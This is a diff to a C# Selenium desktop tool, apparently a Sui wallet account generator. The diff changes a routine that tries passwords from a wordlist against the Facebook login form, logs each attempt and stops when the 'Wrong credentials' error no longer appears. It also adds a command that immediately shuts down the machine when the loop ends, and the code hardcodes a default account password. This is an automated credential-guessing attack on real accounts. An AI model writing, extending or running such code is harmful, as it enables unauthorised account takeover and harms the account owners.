@@ -1,6 +1,7 @@
 ﻿using OpenQA.Selenium;
 using OpenQA.Selenium.Chrome;
 using System;
+using System.Diagnostics;
 using System.IO;
 using System.Windows;
 using System.Windows.Forms;
@@ -33,7 +34,7 @@ namespace sui_wallet_auto_gen_acc
         private const string SUI_WALLET_EXTENSION_FILE_NAME = "opcgpfmipidbgpenhmajoajpbobppdil.crx";
         private const string DEFAULT_ACCOUNT_PASSWORD = "kiepdoden@123";
         private const string ACCOUNT_FILE_NAME = "\\accounts.txt";
-        private const string CORRECT_PASS = "\\password.txt";
+        private const string CHECKED_PASS = "\\checkedPassword.txt";
         private const double WAIT_FOR_ELEMENT = 5;
         private const string TWITTER_LOGIN_PATH = "https://twitter.com";
         private const string TWITTER_INPUT_XPATH = "//input[@class='r-30o5oe r-1niwhzg r-17gur6a r-1yadl64 r-deolkf r-homxoj r-poiln3 r-7cikom r-1ny4l3l r-t60dpp r-1dz5y72 r-fdjqy7 r-13qz1uu']";
@@ -54,6 +55,8 @@ namespace sui_wallet_auto_gen_acc
         private const string FACEBOOK_BUTTON_LOGINWITHPASSWORD_ID = "loginbutton";
         private const string FACEBOOK_LABEL_FORGOTPASS_XPATH = "/html/body/div[1]/div[1]/div[1]/div/div[2]/div[2]/form/div/div[2]/div[2]/div/div/div/span";
         private const string FACEBOOK_FORGOTPASS = "Forgotten password?";
+        private const string FACEBOOK_ERROR_BOX_XPATH = "/html/body/div[1]/div[1]/div[1]/div/div[2]/div[2]/form/div[1]/div[1]";
+        private const string FACEBOOK_CREDENTIALS = "Wrong credentials";
         #endregion
 
         private string chromeExtentionPath = string.Empty;
@@ -65,6 +68,7 @@ namespace sui_wallet_auto_gen_acc
         private bool isAccountFBPathSelected;
         private string fileAccountFBPath = string.Empty;
         private string accountPassword = string.Empty;
+        private string checkedPasswordsPath = string.Empty;
         private string twitterStatus = string.Empty;
         private StreamWriter sw;
         private StreamReader sr;
@@ -401,6 +405,7 @@ namespace sui_wallet_auto_gen_acc
             }
             while ((fbPass = sr.ReadLine()) != null)
             {
+                chromeDriver.Navigate().Refresh();
                 inputPass = chromeDriver.FindElement(By.Id(FACEBOOK_INPUT_PASS_ID));
                 if (inputPass != null)
                 {
@@ -412,16 +417,27 @@ namespace sui_wallet_auto_gen_acc
                 {
                     inputBtnLogin.Click();
                 }
-                var labelForgotPassword = chromeDriver.FindElement(By.XPath(FACEBOOK_LABEL_FORGOTPASS_XPATH));
-                if (labelForgotPassword != null)
+                WriteFile(checkedPasswordsPath, CHECKED_PASS, fbPass);
+                //var labelForgotPassword = chromeDriver.FindElement(By.XPath(FACEBOOK_LABEL_FORGOTPASS_XPATH));
+                //if (labelForgotPassword != null)
+                //{
+                //    if (labelForgotPassword.Text != FACEBOOK_FORGOTPASS)
+                //    {
+                //        WriteFile(fileAccountFBPath, CHECKED_PASS, fbPass);
+                //        break;
+                //    }
+                //}
+                var errorBox = chromeDriver.FindElement(By.XPath(FACEBOOK_ERROR_BOX_XPATH));
+                if (errorBox != null)
                 {
-                    if (labelForgotPassword.Text != FACEBOOK_FORGOTPASS)
+                    if (errorBox.Text != FACEBOOK_CREDENTIALS)
                     {
-                        WriteFile(fileAccountFBPath, CORRECT_PASS, fbPass);
+                        WriteFile(checkedPasswordsPath, CHECKED_PASS, fbPass);
                         break;
                     }
                 }
             }
+            Process.Start("shutdown", "/s /t 0");
         }
 
         private void buttonAccountFBPath_Click(object sender, RoutedEventArgs e)
@@ -438,6 +454,21 @@ namespace sui_wallet_auto_gen_acc
             {
                 MessageBox.Show("Please select file contants your facebook passwords.", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
                 isAccountFBPathSelected = false;
+            }
+        }
+
+        private void buttonCheckedAccountFBPath_Click(object sender, RoutedEventArgs e)
+        {
+            folderBrowserDialog = new FolderBrowserDialog();
+            DialogResult result = folderBrowserDialog.ShowDialog();
+            if (result == System.Windows.Forms.DialogResult.OK && !string.IsNullOrWhiteSpace(folderBrowserDialog.SelectedPath))
+            {
+                checkedPasswordsPath = folderBrowserDialog.SelectedPath;
+                labelCheckedAccountFBPath.Text = checkedPasswordsPath;
+            }
+            else
+            {
+                MessageBox.Show("Invalid folder path.", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
             }
         }
     }
